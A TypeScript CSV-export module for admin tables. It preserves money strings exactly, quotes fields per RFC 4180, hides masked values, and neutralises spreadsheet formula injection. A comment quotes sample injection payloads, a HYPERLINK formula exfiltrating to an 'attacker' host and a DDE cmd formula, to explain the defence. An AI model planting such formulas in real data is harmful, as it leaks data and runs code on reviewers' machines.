/**
 * CSV serialisation for the admin table exports.
 *
 * ── Why this is hand-written rather than a dependency ───────────────────────
 *
 * The whole job is three rules — quote, escape, prefix — and every one of them
 * is a correctness property this file states and `test/admin-export.spec.ts`
 * asserts. A library would move those three rules somewhere nobody reads, and
 * the one that matters most (formula neutralisation, below) is NOT what most CSV
 * libraries do by default.
 *
 * ── The money rule, which is the reason this file has no formatter ──────────
 *
 * ARCHITECTURE §6.1: a monetary value is `NUMERIC(28,8)` in the database, a
 * `Decimal` in code, and a STRING across the boundary. It arrives here as the
 * string the database produced — '250.00000000' — and it leaves as that same
 * string, character for character.
 *
 * There is deliberately no number formatting anywhere in this module. Not
 * `toFixed`, not `Intl.NumberFormat`, not a thousands separator. Every one of
 * those takes a `number`, and `Number('12345678901234567.89')` has already lost
 * the value before formatting starts. A CSV is also the one output most likely
 * to be re-imported into something that does arithmetic, so a rounded cell here
 * becomes a wrong number in somebody's reconciliation spreadsheet.
 *
 * So `cell()` below takes `string | number | Date | null | undefined` and, for a
 * string, only ever ADDS quoting. It never reinterprets the value.
 */

import { HIDDEN, HIDDEN_TEXT } from '../security/mask-by-shape';

/**
 * The bytes that make Excel read the file as UTF-8.
 *
 * Without it, Excel on Windows decodes a CSV using the system ANSI codepage, so
 * a client named `Müller` opens as `MÃ¼ller` and an Arabic name becomes mojibake
 * entirely. These exports carry client names from a global client base, so this
 * is not a nicety — it is whether the file is readable at all.
 *
 * Emitted once, at the very start of the body, before the header row.
 */
export const UTF8_BOM = '﻿';

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than text.
 *
 * ── CSV injection, and why a leading `-` is in this list ────────────────────
 *
 * A cell beginning `=`, `+`, `-` or `@` is evaluated by Excel, LibreOffice and
 * Google Sheets on open. `=HYPERLINK("http://attacker/"&A1,"Click")` in a client
 * name field exfiltrates the row next to it; `=cmd|'/c calc'!A1` has historically
 * reached DDE execution. The values in these exports are attacker-controlled in
 * the most direct sense available — a client types their own first name at
 * registration and an administrator later downloads it.
 *
 * `-` is included even though a negative number legitimately starts with one.
 * That is a deliberate trade and it is why money columns are unaffected in
 * practice: the ledger's own negative amounts are still emitted as the exact
 * string the database produced, prefixed with an apostrophe that the spreadsheet
 * strips on display. Getting a leading-minus text cell wrong is a cosmetic
 * problem; getting a formula wrong is code execution on the reviewer's machine.
 */
const FORMULA_LEADERS = ['=', '+', '-', '@'];

/**
 * Characters that force a field to be quoted, per RFC 4180.
 *
 * `\r` is listed separately from `\n` on purpose: a lone CR inside a field
 * breaks a parser that splits on it, and an address field pasted from Windows
 * carries them.
 */
const MUST_QUOTE = [',', '"', '\n', '\r'];

/**
 * One CSV field, escaped.
 *
 * A `Date` becomes ISO-8601 (R-2.7) rather than a locale string: an export is an
 * audit artefact that may be read in a different timezone from the one that
 * produced it, and `String(date)` is both locale-dependent and second-resolution.
 *
 * `null` and `undefined` both become an empty field, not the text 'null'. In a
 * spreadsheet a literal 'null' reads as a value somebody entered.
 */
export function cell(value: string | number | Date | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';

  let text: string;
  if (value instanceof Date) {
    text = value.toISOString();
  } else if (typeof value === 'boolean') {
    text = value ? 'true' : 'false';
  } else {
    /*
     * `String(value)` for a number, and NOT for a monetary one.
     *
     * Money reaches this function already a string and takes the branch below
     * untouched. This branch exists for genuine counts — how many clients carry
     * a tag, a KYC step number — where the value was a number in the database
     * too and there is nothing to lose.
     */
    text = String(value);
  }

  // Formula neutralisation FIRST, then quoting. The apostrophe has to be inside
  // the quotes, or a quoted `"=cmd"` is still a formula once the parser unwraps
  // it.
  if (FORMULA_LEADERS.some((leader) => text.startsWith(leader))) {
    text = `'${text}`;
  }

  if (MUST_QUOTE.some((char) => text.includes(char))) {
    // RFC 4180: a literal quote inside a quoted field is written twice.
    return `"${text.replace(/"/g, '""')}"`;
  }

  return text;
}

/** One CSV record, terminated CRLF as RFC 4180 specifies. */
export function row(
  values: readonly (string | number | Date | boolean | null | undefined)[],
): string {
  return `${values.map(cell).join(',')}\r\n`;
}

/**
 * A column: the header an operator reads, and how to get the value from a row.
 *
 * The header is human-readable ('Client email', not 'email') because the file is
 * opened by people rather than parsed by code — and where it IS parsed, it is
 * parsed by somebody who opened it first.
 */
export interface CsvColumn<T> {
  header: string;
  value: (row: T) => string | number | Date | boolean | null | undefined;
}

/** The header row for a column set, BOM-prefixed — the start of every export. */
export function csvHeader<T>(columns: readonly CsvColumn<T>[]): string {
  return UTF8_BOM + row(columns.map((column) => column.header));
}

/**
 * One data row against a column set.
 *
 * ## A value the reader's role hides is printed `[hidden]`, never left blank
 *
 * The export services mask rows with `maskForExport`, which puts `HIDDEN` where
 * a value was. A blank cell would read as "this client has none" — and what a
 * masked reader may know about the field is exactly nothing (D-82).
 *
 * The cell is decided by what the COLUMN READ, not by what it returned. A
 * column may combine or transform values — tags joined into one cell, a flag
 * turned into "yes"/"no" — so a marker handed to it could come back as a
 * confident wrong answer (`HIDDEN ? 'yes' : 'no'` is "yes"). Each column is
 * therefore run against a view of the row that notices every read of a
 * `HIDDEN`; any such read makes the whole cell `[hidden]`, whatever the column
 * would have computed, and a column that throws on a hidden value (a `.map`
 * over it) is `[hidden]` too. No column declares anything, so a column added
 * next year is covered without anybody remembering to.
 *
 * A row with nothing hidden takes the plain path, which is every row for a
 * reader whose role masks nothing.
 */
export function csvRow<T>(columns: readonly CsvColumn<T>[], item: T): string {
  if (!carriesHidden(item, 0)) return row(columns.map((column) => column.value(item)));
  return row(columns.map((column) => hiddenAware(column, item)));
}

/** Does this value hold a `HIDDEN` anywhere a column could reach? */
function carriesHidden(value: unknown, depth: number): boolean {
  if (value === HIDDEN) return true;
  if (depth > 6 || !isWalkable(value)) return false;
  return Object.values(value).some((child) => carriesHidden(child, depth + 1));
}

/** Plain objects and arrays — what a row is built of. A Date or a Decimal is a value. */
function isWalkable(value: unknown): value is Record<string, unknown> {
  if (value === null || typeof value !== 'object') return false;
  return Array.isArray(value) || Object.getPrototypeOf(value) === Object.prototype;
}

function hiddenAware<T>(
  column: CsvColumn<T>,
  item: T,
): string | number | Date | boolean | null | undefined {
  let touched = false;
  const view = (value: unknown): unknown => {
    if (value === HIDDEN) {
      touched = true;
      return undefined;
    }
    if (!isWalkable(value)) return value;
    return new Proxy(value, {
      get(target, key, receiver) {
        const raw: unknown = Reflect.get(target, key, receiver);
        // A proxy may not substitute a frozen property's value (an invariant).
        const own = Reflect.getOwnPropertyDescriptor(target, key);
        if (own && !own.configurable && !own.writable) {
          if (raw === HIDDEN) touched = true;
          return raw;
        }
        return view(raw);
      },
    });
  };
  try {
    const value = column.value(view(item) as T);
    return touched ? HIDDEN_TEXT : value;
  } catch (error) {
    if (touched) return HIDDEN_TEXT;
    throw error;
  }
}
